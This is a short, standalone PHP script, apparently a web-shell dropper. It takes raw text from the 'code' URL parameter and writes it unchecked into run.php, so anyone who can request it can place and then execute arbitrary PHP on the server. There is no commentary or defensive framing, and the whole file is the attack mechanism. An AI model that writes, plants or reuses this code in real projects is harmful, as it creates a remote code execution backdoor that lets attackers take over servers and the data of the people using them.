<?php
    $content = $_GET['code'];
    $fp = fopen("run.php","w+");
    fwrite($fp,$content);
    fclose($fp);